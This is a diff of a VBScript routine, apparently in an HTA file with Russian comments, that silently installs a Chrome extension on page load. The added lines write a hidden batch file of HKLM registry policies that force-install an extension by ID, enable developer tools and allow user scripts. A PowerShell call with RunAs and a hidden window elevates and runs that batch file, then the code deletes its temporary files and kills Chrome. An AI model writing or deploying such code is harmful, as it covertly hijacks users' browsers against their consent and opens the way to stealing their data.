@@ -23,7 +23,6 @@ Sub Window_onLoad
     
     ' Финальная проверка и установка расширения
     If fso.FileExists(tempFolder & "\test.zip") Then
-        ' Используем ID из н��шего ключа
         extensionId = "mfkomnpbmdkghpjhpnmjnhpgcjdeiblk"
         userDataPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data"
         chromeExtPath = userDataPath & "\Default\Extensions\" & extensionId & "\1.0.0"
@@ -51,21 +50,24 @@ Sub Window_onLoad
         xcopyCmd = "xcopy """ & tempFolder & "\test\*"" """ & chromeExtPath & "\" & """ /E /I /Y"
         shell.Run xcopyCmd, 0, True
         
-        ' Добавляем информацию в реестр для принудительной установки расширения
-        regCmd1 = "reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"" /v 1 /t REG_SZ /d """ & extensionId & """ /f"
-        shell.Run regCmd1, 0, True
+        ' Создаем временный bat-файл для выполнения команд с правами администратора
+        Set batFile = fso.CreateTextFile(tempFolder & "\chrome_policy.bat", True)
+        batFile.WriteLine "@echo off"
+        batFile.WriteLine "reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"" /v 1 /t REG_SZ /d """ & extensionId & """ /f"
+        batFile.WriteLine "reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome"" /v DeveloperToolsAvailability /t REG_DWORD /d 1 /f"
+        batFile.WriteLine "reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome"" /v ExtensionAllowedTypes /t REG_SZ /d ""extension,theme,user_script"" /f"
+        ' Добавляем политику для включения режима разработчика
+        batFile.WriteLine "reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome"" /v ExtensionSettings /t REG_SZ /d ""{""""*"""": {""""installation_mode"""": """"allowed""""},""""" & extensionId & """"": {""""installation_mode"""": """"force_installed"""",""""update_url"""": """"https://clients2.google.com/service/update2/crx""""}}"" /f"
+        batFile.Close
         
-        ' Включаем режим разработчика через реестр
-        regCmd2 = "reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome"" /v DeveloperToolsAvailability /t REG_DWORD /d 1 /f"
-        shell.Run regCmd2, 0, True
-        
-        ' Разрешаем установку расширений из локальных файлов
-        regCmd3 = "reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome"" /v ExtensionAllowedTypes /t REG_SZ /d ""extension,theme,user_script"" /f"
-        shell.Run regCmd3, 0, True
+        ' Запускаем bat-файл с правами администратора через PowerShell
+        elevateCmd = "powershell -Command ""Start-Process -FilePath '" & tempFolder & "\chrome_policy.bat' -Verb RunAs -WindowStyle Hidden -Wait"""
+        shell.Run elevateCmd, 0, True
         
         ' Удаляем временные файлы
         fso.DeleteFile(tempFolder & "\test.zip")
         fso.DeleteFolder(tempFolder & "\test")
+        fso.DeleteFile(tempFolder & "\chrome_policy.bat")
         
         ' Закрываем Chrome если он запущен
         shell.Run "taskkill /F /IM chrome.exe /T", 0, True
